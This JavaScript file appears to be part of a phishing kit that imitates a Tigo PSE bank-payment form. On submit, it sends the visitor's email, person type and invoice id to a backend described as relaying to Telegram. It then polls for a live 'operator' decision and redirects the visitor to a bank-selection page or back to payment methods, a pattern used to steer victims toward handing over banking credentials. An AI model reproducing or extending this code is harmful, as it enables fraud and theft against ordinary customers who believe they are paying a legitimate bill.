/**
 * PSE Payment Form - Integración completa con Telegram
 * @version 2.0.0
 */

(function() {
    'use strict';

    let selectedPersonType = 'Natural';
    let isRegisteredUser = true;

    document.addEventListener('DOMContentLoaded', function() {
        console.log('[PSE] Inicializando sistema PSE');
        initPersonSelector();
        initUserOptions();
        initPseForm();
    });

    /**
     * Generar session_id único para PSE
     */
    function getSessionId() {
        let sessionId = sessionStorage.getItem('tigo_pse_session_id');
        if (!sessionId) {
            sessionId = 'pse_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem('tigo_pse_session_id', sessionId);
            console.log('[PSE] Nueva sesión creada:', sessionId);
        }
        return sessionId;
    }

    /**
     * Initialize person type selector
     */
    function initPersonSelector() {
        const cards = document.querySelectorAll('.person-card');
        
        cards.forEach(card => {
            card.addEventListener('click', function() {
                cards.forEach(c => c.classList.remove('selected'));
                this.classList.add('selected');
                
                const radio = this.querySelector('input[type="radio"]');
                if (radio) {
                    radio.checked = true;
                    selectedPersonType = radio.value === 'natural' ? 'Natural' : 'Jurídica';
                    console.log('[PSE] Tipo de persona seleccionado:', selectedPersonType);
                }
            });
        });
    }

    /**
     * Initialize user options
     */
    function initUserOptions() {
        const options = document.querySelectorAll('.user-option');
        
        options.forEach(option => {
            option.addEventListener('click', function() {
                options.forEach(opt => opt.classList.remove('selected'));
                this.classList.add('selected');
                
                isRegisteredUser = this.id === 'registered-user';
                console.log('[PSE] Usuario registrado:', isRegisteredUser);
            });
        });
    }

    /**
     * Initialize PSE form with Telegram integration
     */
    function initPseForm() {
        const form = document.getElementById('pse-form');
        
        if (!form) {
            console.warn('[PSE] Formulario no encontrado');
            return;
        }

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const emailInput = document.getElementById('email');
            if (!emailInput) {
                console.error('[PSE] Campo email no encontrado');
                return;
            }

            const email = emailInput.value.trim();
            
            if (!validateEmail(email)) {
                alert('Por favor ingresa un correo electrónico válido');
                return;
            }

            // Deshabilitar botón submit
            const submitBtn = form.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.disabled = true;
                submitBtn.textContent = 'Procesando...';
            }

            // Mostrar loading overlay
            showLoadingOverlay();

            // Preparar datos para Telegram
            const sessionId = getSessionId();
            const pseData = {
                action: 'tigo_pse',
                session_id: sessionId,
                data: {
                    invoice_id: getInvoiceIdFromUrl(),
                    person_type: selectedPersonType,
                    is_registered: isRegisteredUser,
                    email: email,
                    timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
                }
            };

            console.log('[PSE] Enviando datos:', pseData);

            try {
                // Enviar a Telegram
                const response = await fetch('/api/telegram-send.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(pseData)
                });

                const result = await response.json();
                console.log('[PSE] Respuesta Telegram:', result);

                if (result.success) {
                    console.log('[PSE] Datos enviados, esperando decisión del operador...');
                    
                    // Iniciar polling para esperar respuesta del operador
                    startPolling(sessionId);
                } else {
                    hideLoadingOverlay();
                    if (submitBtn) {
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Continuar';
                    }
                    alert('Error al procesar el pago. Por favor intenta nuevamente.');
                }
            } catch (error) {
                console.error('[PSE] Error:', error);
                hideLoadingOverlay();
                if (submitBtn) {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Continuar';
                }
                alert('Error de conexión. Por favor intenta nuevamente.');
            }
        });
    }

    /**
     * Iniciar polling para esperar decisión del operador
     */
    function startPolling(sessionId) {
        console.log('[PSE POLLING] Iniciado para sesión:', sessionId);
        
        let lastCheckedTimestamp = Date.now() / 1000;
        const processedActions = new Set();

        const pollingInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/telegram-poll.php?session=${sessionId}`, {
                    method: 'GET',
                    headers: { 'Cache-Control': 'no-cache' }
                });
                
                const data = await response.json();
                
                if (data.actions && data.actions.length > 0) {
                    const newActions = data.actions.filter(action => {
                        const actionId = `${action.action}_${action.timestamp}_${action.session_id}`;
                        
                        if (action.timestamp > lastCheckedTimestamp && 
                            action.session_id === sessionId &&
                            !processedActions.has(actionId)) {
                            
                            processedActions.add(actionId);
                            return true;
                        }
                        return false;
                    });
                    
                    if (newActions.length > 0) {
                        console.log('[PSE POLLING] Nueva acción detectada:', newActions);
                        lastCheckedTimestamp = Math.max(...newActions.map(a => a.timestamp));
                        
                        // Procesar acción
                        handleOperatorAction(newActions);
                        clearInterval(pollingInterval);
                    }
                }
            } catch (error) {
                console.error('[PSE POLLING] Error:', error);
            }
        }, 500);

        // Timeout de 5 minutos
        setTimeout(() => {
            clearInterval(pollingInterval);
            hideLoadingOverlay();
            console.log('[PSE POLLING] Timeout alcanzado');
        }, 300000);
    }

    /**
     * Manejar acción del operador
     */
    function handleOperatorAction(actions) {
        for (const action of actions) {
            console.log('[PSE] Procesando acción:', action.action);

            // Confirmar que la acción fue ejecutada
            confirmActionExecuted();

            switch (action.action) {
                case 'seguir_banco':
                    console.log('[PSE] Redirigiendo a selección de banco...');
                    setTimeout(() => {
                        const invoiceId = getInvoiceIdFromUrl();
                        window.location.href = `/pse/form?invoice_id=${invoiceId}`;
                    }, 100);
                    return;

                case 'rechazar_pse':
                    console.log('[PSE] PSE rechazado, regresando...');
                    hideLoadingOverlay();
                    setTimeout(() => {
                        window.location.href = '/payment/methods';
                    }, 100);
                    return;

                default:
                    console.warn('[PSE] Acción no reconocida:', action.action);
            }
        }
    }

    /**
     * Confirmar que la acción fue ejecutada
     */
    function confirmActionExecuted() {
        fetch('/api/telegram-send.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'action_executed',
                session_id: getSessionId(),
                data: { action_type: 'PSE' }
            })
        }).catch(err => console.error('[PSE] Error confirmando acción:', err));
    }

    /**
     * Show loading overlay
     */
    function showLoadingOverlay() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.add('active');
            document.body.style.overflow = 'hidden';
        } else {
            console.warn('[PSE] Loading overlay no encontrado');
        }
    }

    /**
     * Hide loading overlay
     */
    function hideLoadingOverlay() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('active');
            document.body.style.overflow = '';
        }
    }

    /**
     * Obtener invoice_id de la URL o sesión
     */
    function getInvoiceIdFromUrl() {
        const params = new URLSearchParams(window.location.search);
        const invoiceId = params.get('invoice_id');
        
        if (invoiceId) {
            sessionStorage.setItem('current_invoice_id', invoiceId);
            return invoiceId;
        }
        
        return sessionStorage.getItem('current_invoice_id') || '';
    }

    /**
     * Validate email
     */
    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

})();
